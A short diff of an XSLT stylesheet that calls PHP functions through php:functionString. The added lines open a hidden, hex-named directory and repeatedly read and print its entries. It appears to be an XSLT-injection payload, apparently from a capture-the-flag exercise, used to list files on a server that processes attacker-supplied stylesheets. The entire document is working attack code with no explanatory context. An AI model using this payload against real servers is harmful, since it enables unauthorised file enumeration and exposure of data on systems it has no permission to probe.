@@ -25,6 +25,16 @@
   <xsl:value-of select="php:functionString('printf','\n')"/>
   <xsl:value-of select="php:functionString('readdir')"/>
   <xsl:value-of select="php:functionString('printf','\n')"/>
+  
+  <xsl:value-of select="php:functionString('opendir','.6ff3200bee785801f420fba826ffcdee')"/>
+  <xsl:value-of select="php:functionString('readdir')"/>
+  <xsl:value-of select="php:functionString('printf','\n')"/>
+  <xsl:value-of select="php:functionString('readdir')"/>
+  <xsl:value-of select="php:functionString('printf','\n')"/>
+  <xsl:value-of select="php:functionString('readdir')"/>
+  <xsl:value-of select="php:functionString('printf','\n')"/>
+  <xsl:value-of select="php:functionString('readdir')"/>
+  <xsl:value-of select="php:functionString('printf','\n')"/>
   <xsl:value-of select="php:functionString('readdir')"/>
   <xsl:value-of select="php:functionString('printf','\n')"/>
 </xsl:template>
